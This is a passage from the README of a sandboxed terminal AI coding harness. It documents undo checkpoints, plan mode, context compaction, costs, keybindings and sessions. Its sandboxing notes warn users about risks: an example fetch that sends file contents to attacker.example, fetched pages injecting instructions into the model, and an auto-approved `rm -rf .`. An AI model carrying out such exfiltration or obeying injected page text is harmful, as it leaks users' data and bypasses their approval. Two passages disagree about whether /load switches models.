  within caps on file count, total size, and time. This is the case the feature
  exists for.

One checkpoint per turn, opened by the first action that changes something — a
turn that only reads leaves nothing behind. Several edits in one turn share it,
and the state it holds is the one the turn *started* from, so `/undo` is one step
however many files the turn touched.

`/undo` asks before it acts, because a restore deletes the files the turn
created, and the panel lists those separately from the ones it will restore.
Confirming also **rewinds the conversation** to before the prompt that started
the turn — both the model's copy of it and the one on screen. That is the point:
leaving the turn in the model's context would leave it certain about writes that
are no longer on disk, and leaving it on screen would have you reading work that
no longer exists anywhere. A notice is left in its place saying what was undone.

`/rewind` is the same thing with a choice of how far. It opens a list of the
conversation — one row per prompt, oldest at the top, **newest at the bottom and
selected**, because that is where you already are. Moving up reaches further
back, and a line above the list keeps saying what going that far would cost:

```
┌ rewind to ────────────────────────────────────────────────────
│  undo 3 turn(s) · 4 file(s) restored · 1 deleted
│
│  add a checkpoint module                          3 file(s)
│› why is retire_superseded_reads keyed on the range?
│  wire it into the approval path                   2 file(s)
│  now make the load modal full screen              1 file(s)
└───────────────────────────────────────────────────────────────
```

Enter commits, and the chosen row and everything after it leave the screen along
with the files and the model's context. There is no second confirmation, because
the summary has been telling you what would happen the whole time the row was
highlighted — that is what makes it an informed press. `/undo` confirms instead,
having shown you nothing beforehand. Every row is a real target: choosing the
bottom one is exactly `/undo`, and Esc is how you do nothing.

Rows are read from the conversation as it stands, not from anything recorded
when the turn ran. A turn that changed no files is still a row — rewinding past
it puts the conversation back even though there is nothing on disk to restore.
Turns that a compaction summarised away are gone from the list, since there is no
longer a point in the conversation to return to; their files can still be
restored, and it says so when that happens.

Checkpoints live in the session's own folder, so `/rename` carries them and two
sessions cannot interleave their numbering. Nothing is pruned by default;
`/checkpoints` lists them and `/checkpoints <n>` keeps only the last `n` turns.
That setting is saved with the session, and `--keep-checkpoints` sets it for a
fresh one.

Four limits, stated rather than hidden:

- **Checkpoints do not know about other sessions.** [Sessions](#sessions) share
  one working directory, and a workspace snapshot taken by one captures whatever
  another has just written — so `/undo` in the first can silently revert the
  second's work. Two sessions editing the same files at once is asking for
  trouble, and this is the shape the trouble takes. Two sessions on separate
  parts of a project are fine.
- **`.git` is not checkpointed.** It is on the walk's skip list on cost, along
  with `target/` and `node_modules/`. `/undo` restores your working tree; git
  remains the backstop for git's own directory.
- **A capped snapshot says so at the time**, in the transcript, rather than at
  `/undo` time when it would be too late to decide differently about running the
  command. The command still runs — refusing an approved action because the
  safety net could not be hung would be a worse answer.
- **`/undo` does not cross a `/fork`**, which starts a new session with its own
  empty checkpoint folder.

## Plan mode

`/plan` (or `/plan add a --json flag`, which enters the mode and starts on that
task) puts the harness in a state where it works out *what to do* before doing any
of it. The plan goes to `plan.md` in the current session's folder, which is also
why a session is a directory: rename or fork the session and the plan goes with it.

**While the mode is on, that plan file is the only writable path on the machine.**
This is the sandbox's rule, not a promise the model makes: the Seatbelt profile is
narrowed to a single `(allow file-write* (literal …))`, so it holds for a shell
command exactly as it does for `<ai-harness-write>`. Reads, fetches, and commands
that only look at things work normally, and that is how the research is meant to
happen. A write aimed anywhere else is refused before you are asked to approve it,
and the model is told why so it can put the plan where it belongs.

The cost of that is worth knowing up front: **anything that needs to write fails
while planning**, including `cargo build`, installs, formatters, and commands that
spill to a temporary file. That is the intended shape of the mode rather than a
limitation to work around — but it is the part most likely to surprise you.

The model is told to ask with `<ai-harness-option>` about anything the code cannot
settle, and to end its turn with `<ai-harness-response>` only once the plan is
written. That response is what raises the decision:

```
┌ execute this plan? ──────────────────────────┐
│ The plan is ready:                           │
│                                              │
│ .ai_harness/sessions/<name>/plan.md          │
│                                              │
│ Executing leaves plan mode, lifting the      │
│ write restriction.                           │
│                                              │
│      [  Execute  ]      Keep planning        │
└──────────────────────────────────────────────┘
```

`Execute` turns the mode off and starts a fresh turn that reads the plan and
carries it out — with writes unrestricted again, and the approval modal back to
being what stands between a proposal and a change. `Keep planning` returns you to
the prompt with the mode still on, so you can say what to change and let the model
revise the file. `/plan` on its own leaves the mode without executing anything.

Auto-approve is unaffected either way. It decides *whether you are asked*; the
narrowed profile decides *what can happen at all*, so an auto-approved command
during plan mode is still confined to reading.

## Setup

Put your OpenRouter key in a `.env` file next to the project (it is gitignored):

```bash
cp .env.example .env
```

Then edit `.env` and set `OPENROUTER_API_KEY`. An exported environment variable
works too and takes precedence over nothing — either source is fine.

## Running

```bash
cargo run
```

Pick a different model, either way:

```bash
cargo run -- --model openai/gpt-4o
```

```bash
OPENROUTER_MODEL=google/gemini-2.5-pro cargo run
```

### Choosing a model

`/model` opens a picker over everything OpenRouter offers, in the prompt's place
like every other panel. The catalog is fetched in the background at startup, so
it is normally already there; open it in the first second and it says so rather
than making you wait.

| Key | Action |
| --- | --- |
| *(type)* | Narrow the list. Terms are matched against the id and the name, and every term must hit — `claude opus` narrows, it does not widen |
| `↑` / `↓` | Move the highlight |
| `Enter` | Switch to the highlighted model |
| `Esc` | Cancel, leaving the model alone |

Rows show the id, the context window, and the price per million input/output
tokens. `/model <id>` sets one directly without the picker, which also works
before the catalog has loaded, or if it failed to.

The switch takes effect on the next turn and lasts the session. Replies already
in the transcript keep the name of the model that produced them — the label says
who said it, not who is answering now. The model is saved with the session, so
`/load` resumes a conversation on the model it was had with, overriding
`--model` for that session.

Give it extra guidance (appended to the protocol contract, never replacing it):

```bash
cargo run -- --system "Prefer ripgrep over grep."
```

## Context compaction

Those bounds keep one turn from running away. They do nothing about the slower
problem: the whole conversation is resent every turn, so a long session walks
steadily toward the model's context limit and then stops dead. `/clear` was the
only escape, and it throws the session away to save it.

At **80% of the model's context window** the older part of the conversation is
shortened instead. `/compact` does it on demand, and `--compact-at` moves the
threshold — `0` turns the automatic pass off and leaves the command.

Two passes, because they discard different things:

- The **mechanical** pass throws away tool *output* — the contents of files
  read, the stdout of commands, the hits from a search — and leaves every user
  prompt and assistant reply byte for byte. That is where the bulk is, and it
  takes no judgement: a 64 KB read result becomes a ~220-byte stub that still
  says `path: src/app.rs`, which is all a model needs to read it again.
- The **model** pass then summarises what is left into prose, in a separate
  request that is not sent the protocol contract — it is asked for prose and
  told outright that an element would be rejected. That is the only way to
  compress *reasoning* rather than data.

The most recent 64 KB is kept verbatim regardless, so the file you are working on
now survives whole, and the cut is nudged back to a user prompt so the tail opens
on a turn rather than halfway through a tool loop. If the summarising request
fails, the mechanical pass stands alone — and in that case the prefix is never
dropped, because deleting the user's own words with nothing in their place is
the one outcome worth refusing outright.

When the catalog does not know the model — it has not loaded, the fetch failed,
or you named a model it has never heard of — there is no window to take 80% of,
so the trigger falls back to a fixed 384 KB of conversation. The notice says
which measure fired, so `168k of 200k tokens` and `380 KB of conversation` are
distinguishable at a glance.

If the provider rejects a request as too long anyway, that is answered **once**:
the harness compacts and sends the same request again. A second overflow in the
same turn gives up and says so rather than looping; only a new prompt re-arms it.

Nothing is lost when this happens. The conversation as it stood goes to
`compaction-001.json` in the session's folder, numbered so a session that
compacts several times keeps every one of them:

```
.ai_harness/sessions/<name>/
├── session.json
├── compaction-001.json
└── compaction-002.json
```

Nothing reads those back yet — they are there so the detail a summary discarded
is still on disk if you want it.

**This confines the filesystem; it is not a security boundary against a
determined attacker.** Network is on, so any command you approve can send
anything it can read. Command output is also sent to OpenRouter, which means
reading a secret leaks it even with no network in the command itself — the `.env`
deny closes the obvious case, and the denylist is not exhaustive.

Two things `<ai-harness-fetch>` specifically does **not** do, both worth knowing
before you leave it auto-approved:

- **It does not stop exfiltration.** An auto-approved read followed by an
  auto-approved fetch of `https://attacker.example/?d=<file contents>` moves
  data off the machine with nobody asked. The address rules do not help here —
  the attacker's host is an ordinary public one. This is a real reduction in
  containment versus routing the network step through `curl`, where you would
  approve it. `--confirm-fetch` puts that approval back.
- **It does not bound what a page says.** Fetched text lands in the model's
  context, and a page can try to instruct it. The result is labelled as
  untrusted when it is handed over, but what actually contains this is
  structural: by default shell, write, and edit still require approval, so a
  page can persuade the model to *propose* something, not to do it. **This is
  the containment `--auto-approve` removes** — see below.

What auto-approve costs, stated plainly: the modal is the structural check in the
paragraph above. With it off, a fetched page that talks the model into proposing a
command gets that command run, inside the sandbox, with nobody asked. The sandbox
still bounds *where* a command can reach; it never bounded *whether* it runs —
that was the modal's job. Nor does the sandbox protect the working directory
itself: it is the root commands are confined *to*, so an auto-approved `rm -rf .`
is inside the boundary, not outside it. Use the mode on a tree you can restore
from git, and prefer `--confirm-fetch` alongside it if the task involves reading
the web.

Non-macOS platforms fail closed at startup rather than running commands
unsandboxed.

## Cost

The status bar carries the current context size and a running token total once a
session has spent anything, and `/cost` prints the breakdown — requests, input
and output tokens, and time actually spent waiting on the model (not wall-clock,
which would count the hours a session sat idle).

The two numbers answer different questions. The total is what the session has
cost; the context figure is how big the conversation is *now*, which is what each
further request pays and what eventually hits the model's limit. The whole
conversation is resent every turn, so most of the total is re-sends. `/cost` also
reports how much of the input the provider served from its own cache — `0%` is a
real answer, and a useful one.

Dollar figures need per-model rates, which differ and change, so they are given
rather than baked in — a hardcoded price table would go stale without anyone
noticing:

```bash
cargo run -- --price-in 0.60 --price-out 2.20
```

Both are dollars per million tokens, and **both** must be set before a cost
appears: input and output rates differ several-fold, so a number derived from one
of them would not be an estimate, it would just be wrong.

Totals are saved with the session and restored on `/load`. They survive `/clear`
— the tokens were bought whether or not the conversation was kept — and a reply
that fails protocol validation is counted too, since a retry loop costs real
money precisely when it is going wrong.

Other flags: `--workdir` sets the sandbox root (default: cwd),
`--command-timeout` the per-command limit in seconds, `--max-iterations` and
`--max-turn-bytes` the agentic loop bounds, `--compact-at` the share of the
context window that triggers [compaction](#context-compaction) (`0` disables it),
`--confirm-reads` puts file reads and
searches behind the approval modal along with everything else, and
`--confirm-fetch` does the same for URL fetches.
`--strict-replies` rejects a reply that narrates before its element rather than
dropping the narration, `--no-reasoning` starts with the reasoning window
hidden, `--no-restore` starts with one fresh session instead of
[reopening the ones you had](#picking-up-where-you-left-off),
`--no-require-memory` lets a reply end a turn without saying what to
[remember](#project-memory), and `--keep-checkpoints` caps how many turns of
[undo history](#checkpoints-and-undo) a fresh session keeps.
`--auto-approve` goes the other way and removes the modal entirely — read
[Sandboxing](#sandboxing) before using it. Every flag also has an environment
variable (`AI_HARNESS_AUTO_APPROVE`, and so on).

## Keys

| Key | Action |
| --- | --- |
| `Enter` | Send the prompt |
| `Alt+Enter` | Insert a newline (also `Shift+Enter` on terminals supporting the kitty keyboard protocol) |
| `Esc` | Interrupt the in-flight reply or running command (while busy) |
| `↑` / `↓` | Recall previous / next prompt (on an empty prompt) |
| `Ctrl+Space` | Open the sessions view (see [Sessions](#sessions)); `Ctrl+T` does the same |
| `l` (in the sessions view) | Open a saved session beside the running ones |
| `Ctrl+C` | Quit — **twice within a second**; one press arms it and the status bar says so |
| `Ctrl+D` | Quit when the prompt is empty |
| `PageUp` / `PageDown` | Scroll the transcript |
| `Ctrl+↑` / `Ctrl+↓` | Scroll one line |
| `End` | Jump back to the newest message when scrolled up |
| `Ctrl+←` / `Ctrl+→` | Move one word left / right (also `Alt`) |
| `Ctrl+W` / `Ctrl+Backspace` | Delete the previous word (also `Alt+Backspace`) |
| `Ctrl+Delete` | Delete the next word (also `Alt+Delete`) |
| `Ctrl+U` | Delete to the start of the line |
| `Ctrl+K` | Clear the prompt |
| `Ctrl+A` / `Ctrl+E` | Start / end of line |
| `Ctrl+Home` / `Ctrl+End` | Start / end of the prompt |

### In any list

Every list in the harness — the `/load` and `/model` pickers, `/rewind`, the
sessions view, the model's question — takes the same motions, so a key that
moves in one moves in all of them:

| Key | Action |
| --- | --- |
| `j` / `k` | Down / up, beside `↓` / `↑` |
| `g` / `G` | First / last, beside `Home` / `End` |
| `Ctrl+D` / `Ctrl+U` | Half a page down / up |
| `PageDown` / `PageUp` | A page |
| `h` / `l` | Move between the two buttons on an approval, `/plan` or `/undo` panel |
| `Enter` | Take the highlighted one |
| `Esc` | Close |

`g` alone rather than vim's `gg`: a pending-key state is a lot of machinery for
one keystroke in a modal you are in for two seconds.

**Lists you can search — `/load`, `/model` and the sessions view — open ready to
be walked, and `/` starts a search**, as it does in a pager. That is the price of
`j` and `k`: a list cannot both take letters as motions and take them as text, so
typing has to be asked for. The query row says which mode it is in.

`Esc` while searching goes back to the list and **keeps the filter** — you
narrowed the list in order to walk it, and clearing it on the way out would undo
the point. A second `Esc` closes the picker. `Enter` takes the highlighted entry
from either mode. Arrow keys still move the highlight while you type, being
unambiguous.

The completion menu is the exception: it appears while you are typing a slash
command in the prompt, so `j` there is the letter. `↑`/`↓` and `Tab` move it.

While the model's question modal is up, the keyboard belongs to it:

| Key | Action |
| --- | --- |
| `↑` / `↓` / `j` / `k` | Move between the choices and the free-text row (wraps) |
| `1`–`9` | Pick that choice outright |
| `Enter` | Answer with the highlighted choice, or with what you typed |
| `Esc` | Dismiss the question (reported to the model, which then continues) |

The free-text row takes the same editing keys as the prompt, word motions and
word deletion included.

Typing goes to the free-text row **only while it is focused**, so a keystroke
aimed at a highlighted choice cannot vanish into a buffer you cannot see. Choices
are clickable too. That is also why `j` and the digits move the highlight only
off that row: on it they are what you are typing. This modal has no `/` search —
its free-text row is an *answer*, not a filter, so there is nothing to start.

The `/model` and `/load` pickers work the same way — each owns the keyboard and
its rows are clickable — except that they open navigable, and `/` starts the
search whose row then takes the prompt's editing keys. See
[In any list](#in-any-list).

Mouse wheel scrolls the transcript. Scrolling up detaches the view; it re-attaches
to the bottom once you scroll back down (or press `End`).

On an empty prompt, `↑` recalls your previous prompts (most recent first) and `↓`
walks back toward the newest, then to an empty line. Editing a recalled prompt
ends the walk; clear the line and press `↑` to browse again. This history is your
session's typed prompts and survives `/clear`.

## Layout

```
┌ ai-harness ──────────────────┐
│ conversation, scrollable     │
│                              │
└──────────────────────────────┘
 ready  model  key hints
┌──────────────────────────────┐
│ > your prompt                │
└──────────────────────────────┘
```

The prompt box grows downward from a fixed bottom edge as you add lines, up to
10 rows, after which it scrolls internally.

When the harness needs something from you — an approval, a question, the `/load`
picker — it takes the prompt's place rather than floating over the conversation,
because it is the same thing: where you answer.

```
┌ ai-harness ──────────────────┐
│ conversation, still readable │
└──────────────────────────────┘
 approve  model  key hints
┌ run this command? ───────────┐
│ The model wants to run:      │
│                              │
│ cargo build --release        │
│                              │
│      [  Allow  ]    Deny     │
└──────────────────────────────┘
```

The panel sizes itself to its contents on the same rule the prompt follows, and
gives way before the transcript does: past its cap it scrolls internally rather
than squeezing the conversation out of view.

The `/load` picker is the exception, and takes the whole screen bar the status
line. Every other panel says one thing, so sizing to it keeps the conversation
you are deciding about in view; the picker is a list you filter, and one that
resized on every keystroke moved the row you were reading towards. Rows come and
go inside a frame that stays where it is. The transcript is not what you are
reading while you choose which conversation to be in.

## Layout of the code

| File | Role |
| --- | --- |
| `src/main.rs` | Event loop; keys, request results, and the redraw tick |
| `src/protocol.rs` | Query encoding, the system prompt, and strict reply parsing |
| `src/command.rs` | Slash-command parsing, the command table, and completion |
| `src/sandbox.rs` | Seatbelt profile generation and the sandboxed command |
| `src/exec.rs` | Running commands: streamed output, idle timeout, output caps, and background jobs |
| `src/files.rs` | Resolving and reading files for `<ai-harness-read>` |
| `src/search.rs` | The confined tree walk behind `<ai-harness-grep>` and `<ai-harness-glob>` |
| `src/compact.rs` | Shortening a conversation that no longer fits |
| `src/fetch.rs` | URL policy, fetching, and HTML-to-text for `<ai-harness-fetch>` |
| `src/diff.rs` | Line-by-line diffs of writes and edits, bounded for storage |
| `src/highlight.rs` | Language detection and tokenising for code blocks |
| `src/markdown.rs` | Markdown subset for rendering model responses |
| `src/ledger.rs` | Cumulative token accounting and the `/cost` report |
| `src/stats.rs` | What a session did, counted from its transcript for `/stats` |
| `src/session.rs` | Session folders under `.ai_harness/` (`/save`, `/load`, `plan.md`, `open.json`) |
| `src/memory.rs` | The `.ai_harness/memory/` index: descriptions in the contract, bodies on demand |
| `src/jobs.rs` | The `.ai_harness/jobs/` directories: job status, logs, and the startup sweep |
| `src/check.rs` | Inferring the project's check command, and what to say about it at startup |
| `src/sessions.rs` | Several sessions at once, and the `Ctrl+Space` view |
| `src/checkpoint.rs` | Per-turn file snapshots and the `/undo` restore |
| `src/tui.rs` | Terminal setup/teardown (raw mode, alt screen, mouse, paste) |
| `src/ui.rs` | Rendering and layout |
| `src/app.rs` | Application state: transcript, history, request status |
| `src/input.rs` | The prompt buffer and its cursor |
| `src/wrap.rs` | Word wrapping shared by the prompt and transcript |
| `src/openrouter.rs` | The OpenRouter client |
| `src/config.rs` | CLI arguments and environment |

## Tests

```bash
cargo test
```

The suite covers wrapping, cursor movement, state transitions, rendering (via
ratatui's `TestBackend`), and the OpenRouter request/response format (against a
local socket — no network, no key).

Eight tests reach the network and are excluded by default. Four check that a
live model obeys the protocol, that a rejected reply recovers when sent our
correction, and that a real request streams in incrementally. Four more fetch
real pages — including one against a public hostname that resolves to
`127.0.0.1`, which only the guarded resolver can catch:

```bash
cargo test -- --ignored live_ --nocapture
```

## Notes

Replies stream in token by token (Server-Sent Events): the text appears live
below the transcript with a `▌` cursor while it arrives. Because the protocol
parser is strict and whole-reply, this is display-only — the approval modal and
command execution still fire only once the full reply has arrived and parsed. A
brief `⠋ thinking…` spinner covers the gap before the first token.

## While a turn is running

The prompt stays usable. You can type, paste, complete a command with `Tab` and
run it while a reply streams or a command executes — `/auto` to stop being asked
about the rest of a turn you have decided to trust, `/reasoning` to see what it
is thinking, `/cost` to see what it is costing.

What is refused is anything that would pull the conversation out from under the
request already in flight: the reply would land on a history that no longer
matches what was sent.

| | |
| --- | --- |
| **Runs** | `/debug` `/auto` `/reasoning` `/cost` `/help` `/checkpoints` `/sessions` `/model` `/save` `/quit` |
| **Waits** | `/clear` `/compact` `/load` `/fork` `/plan` `/undo` `/rewind` `/rename <name>` `/save <name>` |

`/save <name>` is in the second list because it *renames* the session, and the
folder it moves is where the running turn's checkpoint is being written; a plain
`/save` is a snapshot and is fine.

A refusal leaves what you typed **in the prompt**, so a mistimed `Enter` on a
paragraph does not throw the paragraph away. Sending a plain prompt still waits
for the turn to finish — press `Esc` to cancel it, or wait and press `Enter`
again.

## Cancelling

`Esc` interrupts an in-flight turn — a streaming reply or a running command —
and returns to `Idle` without quitting. A cancelled command has its whole process
group killed, reusing the same clean teardown as the timeout, so nothing is left
running. The partial streamed text is discarded (it was display-only) and the
transcript shows a `Cancelled.` notice.

Inside the approval modal, `Esc` still means **Deny** — refuse this command and
let the model try another. To abandon a turn entirely, deny, then `Esc` the reply
that follows.

Cancellation is cooperative: each in-flight `tokio` task carries a cancel signal
it selects on, and every task is tagged with a generation so that updates already
queued by a cancelled task are recognised as stale and dropped rather than
corrupting the next turn.

### Quitting

`Ctrl+C` takes **two presses within a second**. `Esc` is what stops the work
here, while `Ctrl+C` ends every running session at once — and `Ctrl+C` is muscle
memory for "stop this" from every other program, so one press is too small a
gesture for what it does.

The first press arms it and the status bar says `Press Ctrl+C again to quit` in
yellow, replacing the usual hints; in the sessions view the footer says it and
adds that every session closes. The offer lapses after a second, so a `Ctrl+C`
you thought better of is not left waiting to be completed by an unrelated one
later.

`/quit` and `Ctrl+D` on an empty prompt are unchanged and quit outright: both are
already deliberate in a way a reflexive `Ctrl+C` is not.

## Saving and loading sessions

The session **auto-saves after every turn**. Each session is a *folder*, under
`.ai_harness/` in the working directory:

```
.ai_harness/
├── memory/                     ← project notes; see Project memory
│   └── <slug>.md
└── sessions/
    ├── open.json
    └── <name>/
        ├── session.json
        ├── preview.txt
        └── plan.md
```

A folder rather than a file because the conversation is only the first thing a
session owns: `plan.md` is [plan mode](#plan-mode)'s output and sits beside it, and
a folder means `/rename` and `/fork` carry it along without knowing it exists.
`plan.md` is only there once a plan has been written.

`open.json` is the one file that is about the *set* rather than a member of it:
which sessions were open, so launching can reopen them. It sits among the folders
and is not mistaken for one, because listing keys on `<entry>/session.json`
rather than on "is a directory".

`preview.txt` is the session's last few lines of prose, written on every save so
the `/load` picker can show what each session was about. It exists as its own file
because `session.json` runs to hundreds of kilobytes and the picker opens every
session at once — parsing them all to show three lines each would get slower the
longer you use the harness. It is derived data: delete it and the next save writes
it again.

`.ai_harness/` lives under the **sandbox root**, so sessions belong to the project
rather than to whichever directory you launched from: running against two projects
from one terminal keeps them apart, and running against one project from two
terminals finds the same sessions. `--sessions-dir` overrides the location and is
used exactly as given. The whole directory is gitignored.

Until you name it, each run writes to a per-launch `session-<timestamp>/`, so runs
never overwrite each other.

> Sessions saved before this layout (loose `sessions/*.json` files) are **not
> migrated and not read**. Nothing looks there any more; delete the old
> `sessions/` directory when you no longer want them.

- `/rename <name>` — rename the current session's folder (the name it loads
  under). Everything in the folder moves with it.
- `/fork [name]` — branch: freeze the current session where it is and keep talking
  under a new name. Both start identical and diverge from the fork point; the
  original is preserved to `/load` back.
- `/save [name]` — save now and, with a name, adopt it going forward.
- `/load <name>` — restore a session. `/load` with no name opens a picker: move
  with `j`/`k` or `↑`/`↓` or the mouse, `/` to filter, `Enter` or click to load,
  `Esc` to cancel. Each entry shows its name, the model it was held with (right of the
  name — loading switches to it), and the session's last few lines, so the list
  can be read rather than navigated — names are timestamps until you `/rename`
  them, and a timestamp says nothing about what a session was. Sessions saved
  before previews existed show a bare name until their next save.

  The list is ordered by when each session was last worked in, most recent
  first, since that is nearly always the one you want. A search narrows it on the
  name and the model, matching the `/model` picker: every whitespace-separated
  term must appear, so terms narrow rather than widen. Filtering does not
  reorder — a list that rearranged itself under a query would move the row you
  were reaching for.
- `/clear` — wipe the conversation, **including its saved file** (it is
  overwritten to the cleared state). Use `/fork` first if you want to keep it.
  The model you are on is session state, not conversation state, so it survives.

A session records the model it was held with, and `/load` resumes on it — see
[Choosing a model](#choosing-a-model).

All of these work only when idle.

`session.json` is pretty-printed JSON holding the model conversation (`history`,
so you can keep talking) and the rendered transcript (so the screen comes back
exactly — labelled actions, command results, token counts). A `version` field
guards the format. `/clear` never touches saved files, so `/save`, `/clear`,
`/load` round-trips.

The model is recorded but not switched on load — it is fixed at startup, so
loading a session saved under a different model keeps the running one for new
turns and notes the difference.
